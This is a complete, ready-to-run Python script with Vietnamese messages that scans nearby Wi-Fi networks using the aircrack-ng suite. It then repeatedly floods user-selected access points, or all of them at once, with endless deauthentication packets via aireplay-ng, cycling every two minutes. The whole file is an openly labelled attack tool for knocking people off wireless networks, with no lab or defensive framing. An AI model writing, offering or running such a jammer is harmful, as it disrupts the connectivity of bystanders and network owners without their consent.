#!/usr/bin/env python3
import subprocess
import time
import csv
import os
import signal
import glob
import sys

# ANSI màu cho terminal
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    RESET = "\033[0m"
    BOLD = "\033[1m"

def color_text(text, color):
    return f"{color}{text}{Colors.RESET}"

def check_root():
    if os.geteuid() != 0:
        print(color_text("⚠️  Chạy script bằng quyền root (sudo)!", Colors.RED))
        sys.exit(1)

def get_interfaces():
    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.splitlines():
        if not line.startswith(" ") and line.strip():
            iface = line.split()[0]
            if "no wireless extensions" not in line:
                interfaces.append(iface)
    return interfaces

def auto_select_interface(preferred_order):
    interfaces = get_interfaces()
    for pref in preferred_order:
        if pref in interfaces:
            print(color_text(f"✔️  Tự động chọn card mạng: {pref}", Colors.GREEN))
            return pref
    if interfaces:
        print(color_text(f"⚠️  Không tìm card ưu tiên, dùng card đầu tiên: {interfaces[0]}", Colors.YELLOW))
        return interfaces[0]
    else:
        print(color_text("❌ Không tìm thấy card mạng nào!", Colors.RED))
        sys.exit(1)

def enable_monitor_mode(interface):
    print(color_text("🔒 Tắt các process ảnh hưởng bằng airmon-ng check kill...", Colors.CYAN))
    subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(color_text(f"📡 Bật monitor mode trên: {interface}", Colors.CYAN))
    subprocess.run(["airmon-ng", "start", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(4)
    result2 = subprocess.run(["iwconfig"], capture_output=True, text=True)
    lines = result2.stdout.splitlines()
    for line in lines:
        if "Mode:Monitor" in line:
            return line.split()[0]
    return interface + "mon"

def disable_monitor_mode(interface):
    print(color_text(f"🔧 Tắt monitor mode trên: {interface}", Colors.CYAN))
    subprocess.run(["airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def progress_bar(seconds, prefix="", color=Colors.GREEN):
    bar_length = 30
    for i in range(seconds):
        percent = (i + 1) / seconds * 100
        filled = int(bar_length * (i + 1) / seconds)
        bar = "=" * filled + "-" * (bar_length - filled)
        sys.stdout.write(f"\r{color}{prefix} [{bar}] {percent:3.0f}%{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print()

def start_airodump(interface):
    for f in glob.glob("scan*.csv"):
        try: os.remove(f)
        except: pass
    proc = subprocess.Popen(["airodump-ng", "--write", "scan", "--output-format", "csv", interface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    progress_bar(10, prefix="⏳ Quét mạng", color=Colors.BLUE)
    proc.send_signal(signal.SIGINT)
    proc.wait()
    return proc

def latest_csv(prefix="scan"):
    files = glob.glob(prefix + "*.csv")
    if not files: return None
    return max(files, key=os.path.getctime)

def parse_csv():
    fname = latest_csv()
    if not fname:
        print(color_text("❌ Không có file CSV nào.", Colors.RED))
        return []
    networks = []
    with open(fname, newline='', encoding='utf-8', errors='ignore') as csvfile:
        reader = csv.reader(csvfile)
        reading = False
        for row in reader:
            if not row: continue
            if row[0].strip() == "BSSID":
                reading = True
                continue
            if reading and (row[0].strip() == "" or "Station MAC" in row[0]):
                break
            if reading and len(row) >= 14:
                essid = row[13].strip()
                if essid:
                    networks.append({
                        "bssid": row[0].strip(),
                        "channel": row[3].strip(),
                        "privacy": row[5].strip(),
                        "power": row[8].strip(),
                        "essid": essid
                    })
    return networks

def print_networks(networks, selected=None):
    os.system("clear" if os.name == "posix" else "cls")
    print(color_text(f"{'No.':<4} {'BSSID':<20} {'CH':<3} {'ENC':<7} {'PWR':<5} ESSID", Colors.BOLD))
    for i, net in enumerate(networks):
        pwr_color = Colors.GREEN if int(net['power']) > -70 else Colors.YELLOW if int(net['power']) > -85 else Colors.RED
        essid_color = Colors.RED if selected and net['bssid'] in [s['bssid'] for s in selected if s['missed']] else Colors.RESET
        line = f"{color_text(str(i+1), Colors.CYAN):<4} {net['bssid']:<20} {net['channel']:<3} {net['privacy']:<7} {color_text(net['power'], pwr_color):<5} {color_text(net['essid'], essid_color)}"
        print(line)

def attack_network(mon_iface, target):
    print(color_text(f"🚀 Tấn công {target['essid']} (CH {target['channel']})", Colors.MAGENTA))
    subprocess.run(["iwconfig", mon_iface, "channel", target["channel"]], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", target["bssid"], mon_iface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def attack_progress_bar(seconds):
    bar_length = 30
    for i in range(seconds):
        percent = (i + 1) / seconds * 100
        color = Colors.RED if percent < 33 else Colors.YELLOW if percent < 66 else Colors.GREEN
        filled = int(bar_length * (i + 1) / seconds)
        bar = "#" * filled + "-" * (bar_length - filled)
        sys.stdout.write(f"\r{color}⚔️  Đang tấn công: [{bar}] {percent:3.0f}%{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print()

def main():
    check_root()
    preferred = ["wlan0", "wlan1", "wlp2s0", "wlp3s0"]
    base_iface = auto_select_interface(preferred)
    mon_iface = enable_monitor_mode(base_iface)

    print(color_text("⏳ Quét và tấn công sẽ lặp lại mỗi 120 giây. Nhấn Ctrl+C để dừng.", Colors.YELLOW))
    selected_targets = []

    try:
        while True:
            start_airodump(mon_iface)
            networks = parse_csv()
            if not networks:
                print(color_text("🔄 Không thấy mạng nào. Chờ 120s rồi quét lại.", Colors.RED))
                time.sleep(120)
                continue

            # Gắn cờ "missed" nếu mạng đã chọn bị mất
            for sel in selected_targets:
                sel["missed"] = not any(net["bssid"] == sel["bssid"] for net in networks)

            print_networks(networks, selected_targets)

            if not selected_targets:
                selection = input(color_text("👉 Nhập số hoặc 'all' để chọn tất cả: ", Colors.CYAN))
                if selection.strip().lower() == "all":
                    selected_targets = networks.copy()
                else:
                    indices = [int(i.strip()) - 1 for i in selection.split(',') if i.strip().isdigit()]
                    selected_targets = [networks[i] for i in indices if 0 <= i < len(networks)]

                if not selected_targets:
                    print(color_text("❌ Không có mạng hợp lệ. Chờ 60s rồi thử lại.", Colors.RED))
                    time.sleep(60)
                    continue

            processes = []
            for target in selected_targets:
                if not target.get("missed", False):
                    p = attack_network(mon_iface, target)
                    processes.append(p)

            attack_progress_bar(60)

            for p in processes:
                p.terminate()
            for p in processes:
                p.wait()

            print(color_text("\n🔄 Lặp lại vòng quét...\n", Colors.YELLOW))
    except KeyboardInterrupt:
        print(color_text("\n⛔ Đang dừng...", Colors.RED))
        for p in processes:
            p.terminate()
        for p in processes:
            p.wait()
    finally:
        disable_monitor_mode(mon_iface)
        print(color_text("✅ Đã khôi phục lại kết nối mạng.", Colors.GREEN))

if __name__ == "__main__":
    main()
